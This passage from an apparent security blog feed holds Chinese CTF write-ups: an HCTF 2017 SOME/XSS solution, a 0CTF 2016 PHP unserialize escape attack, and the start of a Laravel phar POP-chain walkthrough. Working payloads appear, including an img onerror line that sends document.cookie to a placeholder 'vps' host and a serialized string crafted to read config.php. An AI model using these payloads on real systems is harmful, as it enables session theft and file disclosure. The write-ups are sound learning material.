class="line">        location.replace(<span class="string">"http://desert.2017.hctf.io/user.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(start_some(), <span class="number">1000</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        location.replace(<span class="string">"http://desert.2017.hctf.io/edit.php?callback=RandomProfile&amp;user=xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(attack, <span class="number">2000</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>xxx为自己创建的用户名字</p><p>然后在xxx用户的message写入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;\&quot; onerror=window.location.href=&apos;http://vps?cookie=&apos;%2bdocument.cookie&gt;</span><br></pre></td></tr></table></figure><p>使用report方法，使admin用户访问1.html，最终getflag</p><p>其实本身我对于some攻击其实还是不是非常了解<br>小小的总结下Str3am师傅对其的解释（顺便也能够帮助我了解同源策略以及jsonp</p><blockquote><p><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169873.html</a></p></blockquote><p>Some 攻击首先是要对于同源策略以及jsonp有所了解,</p><blockquote><p><a href="https://www.someattack.com/Playground/About" target="_blank" rel="noopener">https://www.someattack.com/Playground/About</a><br>这是一个some攻击的靶场</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JSONP为一种用户可控制js执行函数的跨域数据访问技术</span><br><span class="line">正是由于JSONP可以控制执行函数的特性，产生了SOME攻击，</span><br><span class="line">（就比如说这题由于用户能够控callback中的函数所以导致了some攻击，</span><br><span class="line">这里主要涉及到一个jsonp的技术（我本身暂时还没有了解</span><br><span class="line"></span><br><span class="line">some攻击在目前我看来是一种xss的扩展，</span><br><span class="line">通过构造payload使得父页面以及子页面同源，</span><br><span class="line">使得子页面的domxss能够对父页面进行某种操作</span><br><span class="line"></span><br><span class="line">具体这个some攻击的产生原因我还没有特地深入了解</span><br><span class="line">其实我认为使用window.open产生的父页面以及子页面应该就算是同源了。</span><br><span class="line">但是在这题中admin打开的页面并非是自己的子页面</span><br><span class="line">所以需要在自己vps中构造payload使得它们同源</span><br><span class="line">（这里有个地方注意的是firefox与chrome已经禁止了window.open，可以使用iframe代替</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://lorexxar.cn/2017/11/15/hctf2017-deserted-world/" target="_blank" rel="noopener">https://lorexxar.cn/2017/11/15/hctf2017-deserted-world/</a><br><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169873.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      some攻击可以看成是xss的一种扩展
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>0ctf_2016_unserialize(php反序列化逃逸字符)</title>
    <link href="https://museljh.github.io/2019/03/20/0ctf_2016_unserialize(php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6)/"/>
    <id>https://museljh.github.io/2019/03/20/0ctf_2016_unserialize(php反序列化逃逸字符)/</id>
    <published>2019-03-19T16:11:21.000Z</published>
    <updated>2019-03-19T16:52:04.198Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-0ctf-2016-unserialize-php反序列化逃逸字符"><a href="#一-0ctf-2016-unserialize-php反序列化逃逸字符" class="headerlink" title="一.0ctf_2016_unserialize(php反序列化逃逸字符)"></a>一.0ctf_2016_unserialize(php反序列化逃逸字符)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">知识点:</span><br><span class="line">* 代码审计</span><br><span class="line">* Unserialize</span><br><span class="line">* LFR</span><br></pre></td></tr></table></figure><p><a href="http://www.Zip源码泄露获取源码" target="_blank" rel="noopener">www.Zip源码泄露获取源码</a></p><p>通过源码，我们可以发现在config.php中的flag，这题意图已经很明显了，是要我们读取config.php文件的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">$config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">$config[&apos;password&apos;] = &apos;&apos;;</span><br><span class="line">$config[&apos;database&apos;] = &apos;&apos;;</span><br><span class="line">$flag = &apos;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注册并登入，在cookie里发现bottle.session，说明很有可能这道题目是由Python的 bottle框架搭建的，与此同时在profile.php找到<code>$profile = unserialize($profile);</code>，        <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code>中包含有<code>unserialize</code>与<code>file_get_contents</code>，猜测这道题是需要利用unserialize反序列构造file_get_contents执行RCE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[&apos;phone&apos;];</span><br><span class="line">$email = $profile[&apos;email&apos;];</span><br><span class="line">$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br></pre></td></tr></table></figure><p>可以看到无论是<code>file_get_contents($profile[&#39;photo&#39;])</code>，还是<code>unserialize($profile)</code>都是通过<code>$profile</code>进行控制的，我们现在看看<code>$profile</code>变量能否被我们控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line">if($profile  == null) &#123;</span><br></pre></td></tr></table></figure><p>经过查找我们可以发现<code>$profile</code> 变量来源于<code>show_profile</code>方法，我们通过传入一个<code>$username</code>变量后引用了父类mysql的方法<code>filter</code>、<code>select</code>，最后返回了一个<code>$object</code>，而<code>profile</code>就是在这个<code>$object</code>变量中，让我看看mysql类中的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">    class user &#123;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">        public function show_profile($username) &#123;</span><br><span class="line">            $username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">            $where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">            $object = parent::select($this-&gt;table, $where);</span><br><span class="line">            return $object-&gt;profile;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    class mysql &#123;</span><br><span class="line">private $link = null;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">public function select($table, $where, $ret = &apos;*&apos;) &#123;</span><br><span class="line">$sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;</span><br><span class="line">$result = mysql_query($sql, $this-&gt;link);</span><br><span class="line">return mysql_fetch_object($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">&#125;</span><br><span class="line">public function __tostring() &#123;</span><br><span class="line">return __class__;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一连串代码作用已经很明显是要验证用户信息的。<code>filter</code>方法防止我们将会过滤符号\,\\字符串<code>select</code>,<code>insert</code>,<code>update</code>,<code>delete</code>。</p><p>经过寻找我们可以找到</p><p><code>$profile[&#39;photo&#39;])</code>  是源于update.php中        <code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&apos;/^\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class="line">die(&apos;Invalid phone&apos;);</span><br><span class="line"></span><br><span class="line">if(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class="line">die(&apos;Invalid email&apos;);</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">die(&apos;Invalid nickname&apos;);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[&apos;photo&apos;];</span><br><span class="line">if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class="line">die(&apos;Photo size error&apos;);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class="line">$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class="line">$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class="line">$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class="line">$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class="line">      $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br></pre></td></tr></table></figure><p>原本这段其实是没有问题的，关键是它先将<code>$profile</code>进行序列化后再进行存入数据库，而<code>filter</code>函数中会将<code>where</code>字符串转换成<code>hacker</code>，where是五个字符而hacker是六个字符，这样就给我提供了反序列化逃逸字符的条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化逃逸字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line"></span><br><span class="line">$profile[&apos;phone&apos;] = &apos;11115908609&apos;;</span><br><span class="line">$profile[&apos;email&apos;] = &apos;1049135811@qq.com&apos;;</span><br><span class="line">$profile[&apos;nickname&apos;] = &apos;aa&apos;;</span><br><span class="line">$profile[&apos;photo&apos;] = &apos;aaa&apos;;</span><br><span class="line">$a=serialize($profile);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11115908609&quot;;s:5:&quot;email&quot;;s:17:&quot;1049135811@qq.com&quot;;s:8:&quot;nickname&quot;;s:2:&quot;aa&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;</span><br></pre></td></tr></table></figure><p>我们修改下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$profile[&apos;nickname&apos;] = &apos;aa&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;&apos;;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11115908609&quot;;s:5:&quot;email&quot;;s:17:&quot;1049135811@qq.com&quot;;s:8:&quot;nickname&quot;;s:27:&quot;aa&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;</span><br></pre></td></tr></table></figure><p>因为多出<code>&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;}</code><br>于是我们可以hacker比where多的字符将其顶替,这里多处的字符用1代替<br>比如这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11115908609&quot;;s:5:&quot;email&quot;;s:17:&quot;1049135811@qq.com&quot;;s:8:&quot;nickname&quot;;s:27:&quot;aa1111111111111111111111111&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;</span><br></pre></td></tr></table></figure><p>最后得到<br><img src="https://i.imgur.com/hvvkk2B.png" alt=""><br>同理我们可以将aaa换成我们想要的比如config.php就可以读出flag了,<br>将得到的base64解码后的到flag<br><img src="https://i.imgur.com/YpHBfEu.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="noopener">http://blog.nsfocus.net/rpo-attack/</a><br><a href="https://lorexxar.cn/2018/01/02/34c3-writeup/#urlstorage" target="_blank" rel="noopener">https://lorexxar.cn/2018/01/02/34c3-writeup/#urlstorage</a><br><a href="http://www.yqxiaojunjie.com/index.php/archives/171/" target="_blank" rel="noopener">http://www.yqxiaojunjie.com/index.php/archives/171/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      使用unserialize逃逸出多余的字符串导致命令执行
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php反序列化" scheme="https://museljh.github.io/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化之寻找pop链入门练习</title>
    <link href="https://museljh.github.io/2019/03/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AF%BB%E6%89%BEpop%E9%93%BE%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0/"/>
    <id>https://museljh.github.io/2019/03/10/PHP反序列化之寻找pop链入门练习/</id>
    <published>2019-03-10T05:43:58.000Z</published>
    <updated>2019-03-10T05:49:05.223Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文不仅是对php反序列化Pop链的寻找，同时也是加深我对Laravel框架的理解</p><h2 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h2><p>本文基于本文以 code-breaking 中 lumenserial 为例，该题是基于Laravel框架搭建的，主要是看到安全客有一个师傅写了一篇关于这个的练习，感觉很不错，所以拿这题来练习。之前对于PHP框架只有稍微了解了下ThinkPHP有所了解，对这个框架第一印象是感觉这很像传统PHP框架和python框架的结合，之后看了下对于它源码的解析后才觉得这个框架有点牛逼。写这题也是提升自己对Laravel框架理解。<br>题目地址:</p><blockquote><p><a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p></blockquote><p>更新P牛制作的docker环境(我觉得有点问题，但是修改了半天DockerFile文件还是不可以，不知道为什么) </p><blockquote><p><a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking</a></p></blockquote><p>利用 phar 拓展 php 反序列化漏洞攻击面</p><blockquote><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p></blockquote><blockquote></blockquote><p>一句话总结下Phar反序列就是构造个phar格式的文件里面有我们需要序列化的内容，这种格式它会自己序列化，然后通过一些可控的文件函数通过Phar：//xxx，去调用这个文件然后就反序列，具体看</p><blockquote><p><a href="http://www.lmxspace.com/2018/11/07/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Phar/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/11/07/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Phar/</a><br><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p></blockquote><p>其实对于这题来说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    protected function doCatchimage(Request $request)</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">        if ($sources) &#123;</span><br><span class="line">            foreach ($sources as $url) &#123;</span><br><span class="line">                $rets[] = $this-&gt;download($url);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    private function download($url)</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">        $content = file_get_contents($url);</span><br><span class="line">        $img = getimagesizefromstring($content);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在EditorController.php中有一个doCatchimage方法，可以传入一个数组变量$sources，调用download($url)方法,url 变量没有经过任何处理用在了 file_get_contents 函数中，不过貌似对于laravel框架还是有对函数进行过滤的，<br>至于在哪里禁用的我找半天没找到，禁用了以下函数（好吧后来我看到别的师傅写道，这些信息通过 phpggc 的第一个 Laravel 框架 RCE 生成 phpinfo 函数的利用 phar 即可看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">disable_functions：</span><br><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br><span class="line"></span><br><span class="line">disable_classes：</span><br><span class="line">GlobIterator,DirectoryIterator,FilesystemIterator,RecursiveDirectoryIterator</span><br></pre></td></tr></table></figure><p>我们可以使用phar进行反序列，构造如下代码进行利用，但是如何找到可利用的方法是一个难题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://website/server/editor/?action=Catchimage&amp;source[]=phar://xxx.gif</span><br></pre></td></tr></table></figure><p>可以通过PHPGGC寻找到Laravel框架RCE 的 4种payload 。<br>我们稍微讲下其中一条Pop链，其他的应该类比就可以挖掘<br>主要讲的是RCE1<br>可以看到在PHPGGC中它是这样表示的。<br><img src="https://i.imgur.com/BLwelLd.png" alt=""></p><p>其实七月火师傅已经讲的很清晰了，如果一下看不是非常明白，可以去多了解下Laravel框架，回头再看会清晰一些。</p><blockquote><p><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170681</a></p></blockquote><p><img src="https://i.imgur.com/NoatfJa.png" alt=""><br>这张是来自七月火师傅，感觉没有这张图理解起来会比较困难</p><p>Pop链：</p><p>1.毫无疑问laravel框架的四个RCE都是从PendingBroadcast-&gt;__destruct()方法出去的，</p><hr><p>以下均为我个人理解（目的是更好、好来更好理解laravel框架源码loc容器）：PendingBroadcast这个函数是laravel框架事件调用的具体类，并且通过BroadcastManager类注册PendingBroadcast进laravel框架loc容器中（BroadcastManager类继承了FactoryContract类）</p><p>FactoryContract类是一种的loc容器的合约规定了各种容器的模板，<br>可以看到如下有许多类型很多类似PendingBroadcast的loc实现类继承了FactoryContract的loc合约类（实现类，合约类是我乱讲的估计是没有这个玩意），并且这些实现类中又注册了各种laravel框架的具体实现类，<br><img src="https://i.imgur.com/rmmxUFe.png" alt=""></p><p>比如说PendingBroadcast类就是实现了对于事件调用，也就是even的具体实现，而在laravel框架 App\Events 下面的even.php就是通过 Illuminate\Support\Facades 下面的even.php，返回的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Event extends Facade</span><br><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">    protected static function getFacadeAccessor()</span><br><span class="line">    &#123;</span><br><span class="line">        return &apos;events&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Facade</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        $factory = new Factory;</span><br><span class="line"></span><br><span class="line">        $iterator = $factory-&gt;getFileIterator($paths, $suffixes, $prefixes, $exclude);</span><br><span class="line"></span><br><span class="line">        $files = [];</span><br><span class="line"></span><br><span class="line">        foreach ($iterator as $file) &#123;</span><br><span class="line">            $file = $file-&gt;getRealPath();</span><br><span class="line"></span><br><span class="line">            if ($file) &#123;</span><br><span class="line">                $files[] = $file;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到Event这个类继承了Facade这个类,而Facade这个类又创建了工厂</p><p>那么我们可不可以理解为当even被初始化的时候创建了一个工场然后调用工厂中所拥有的BroadcastManager之下的PendingBroadcast类呢？</p><p>以上均是我瞎想的，肯定有错误，不要轻信，这么以一顿思考之后对于Laravel框架有了一定初步认识，不知道其他框架是怎么样子的。</p><p>经过前面一番思考，最终可以得出结论PendingBroadcast类肯定是会被调用的，并且很重要，应该不是那么容易被改掉的吧？大概</p><hr><p>这里主要是参考hpdoger师傅的博客</p><blockquote><p><a href="http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/" target="_blank" rel="noopener">http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class PendingBroadcast</span><br><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">    public function __construct(Dispatcher $events, $event)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;event = $event;</span><br><span class="line">        $this-&gt;events = $events;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化的突破口一般是需要需要找到魔法函数<strong>destruct|</strong>wakeup<br>回到主题PendingBroadcast类中__destruct()方法调用了一个evens类的dispatch方法并且传入了$this-&gt;event。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Illuminate\Contracts\Events\Dispatcher;</span><br></pre></td></tr></table></figure><p>先看下dispatch方法，可以看到PendingBroadcast类调用了一个Dispatcher类，我们往下探寻看下Dispatcher类是干什么的。好吧，其实并不需要看这个类是干什么的。</p><p>通过寻找<code>__call</code> 魔法函数我们可以重构Dispatcher类，我们可以找到（不是我找到）ValidGenerator类中<code>__call</code>方法中有一个<code>$res = call_user_func_array(array($this-&gt;generator, $name), $arguments)</code>也就是说我们只要控制了<code>array($this-&gt;generator, $name)</code>我们就可以执行任意方法，同样原理我们只需要构造generator类中不存在的<code>$name</code>方法便可以调用generator类中的<code>__call</code>方法重构这个<code>$name</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 